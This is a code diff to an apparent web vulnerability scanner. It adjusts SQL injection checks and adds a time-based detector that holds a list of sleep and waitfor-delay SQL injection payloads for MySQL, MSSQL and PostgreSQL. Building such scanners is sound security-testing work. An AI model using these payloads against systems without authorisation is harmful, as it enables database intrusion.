@@ -60,7 +60,7 @@ class SQLiErrorBased( ParamsScanner ):
         ]
 
         for err in expected_errors:
-            if err.lower() in res.text.lower():
+            if err in res.text:
                 return Status.Vulnerable
 
         return Status.NotVulnerable
@@ -91,10 +91,10 @@ class SQLiBooleanBased( ParamsScanner ):
             endpoint = self.DeepCloneEndpoint()
             self.change_defaults( endpoint ) # Change default params values
             self.newResponse = self.send_request( endpoint )
+            if not ( self.newResponse and self.orgResponse ): return False
             self.newRespStripped = self.strip(self.newResponse.text, endpoint.GetAllParams())
             
-            return self.newResponse and self.orgResponse and \
-                self.newResponse.ok and self.orgResponse.ok and \
+            return self.newResponse.ok and self.orgResponse.ok and \
                 ( self.newRespStripped == self.orgRespStripped or \
                 self.percent_response_change( self.orgRespStripped, self.newRespStripped ) in range( 40 ) )
 
@@ -225,3 +225,46 @@ class SQLiBooleanBased( ParamsScanner ):
         return prev_row[ -1 ]
 
 
+class SQLiTimeBased( ParamsScanner ):
+
+    SLEEP_TIME = "8"
+
+    def __init__(self, config, info = {
+        "Authors": ["Abdallah Mohamed"],
+        "Name": "SQL Injection",
+        "Description": 'The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.',
+        "Risk": Risk.Critical,
+        "Referances": [
+            "https://cwe.mitre.org/data/definitions/89.html",
+            "https://owasp.org/www-community/attacks/SQL_Injection"
+        ]
+    }) -> None:
+        ParamsScanner.__init__(self, config, info)
+        self.AppendPayloadToDefaultValue()
+
+    def GetPayloads(self) -> list:
+        return [
+            f" or sleep({SQLiTimeBased.SLEEP_TIME})#",
+            f" OR SLEEP({SQLiTimeBased.SLEEP_TIME})#",
+            f"' or sleep({SQLiTimeBased.SLEEP_TIME})#",
+            f"' OR SLEEP({SQLiTimeBased.SLEEP_TIME})#",
+            f"ORDER BY SLEEP({SQLiTimeBased.SLEEP_TIME}) --",
+            f"' ORDER BY SLEEP({SQLiTimeBased.SLEEP_TIME}) --",
+            f";waitfor delay '0:0:{SQLiTimeBased.SLEEP_TIME}'--",
+            f");waitfor delay '0:0:{SQLiTimeBased.SLEEP_TIME}'--",
+            f"';waitfor delay '0:0:{SQLiTimeBased.SLEEP_TIME}'--",
+            f"\";waitfor delay '0:0:{SQLiTimeBased.SLEEP_TIME}'--",
+            f"\");waitfor delay '0:0:{SQLiTimeBased.SLEEP_TIME}'--",
+            f" pg_sleep({SQLiTimeBased.SLEEP_TIME}) --",
+            f" or pg_sleep({SQLiTimeBased.SLEEP_TIME}) --"
+        ]
+
+    def is_vulnerable(self, response) -> Status:
+        if response.status_code == 504 or float(SQLiTimeBased.SLEEP_TIME) - 1 < response.elapsed.total_seconds() < float(SQLiTimeBased.SLEEP_TIME) + 2:
+            return Status.Vulnerable
+
+        elif response.elapsed.total_seconds() > float(SQLiTimeBased.SLEEP_TIME) + 2:
+            return Status.Maybe
+
+        return Status.NotVulnerable
+            
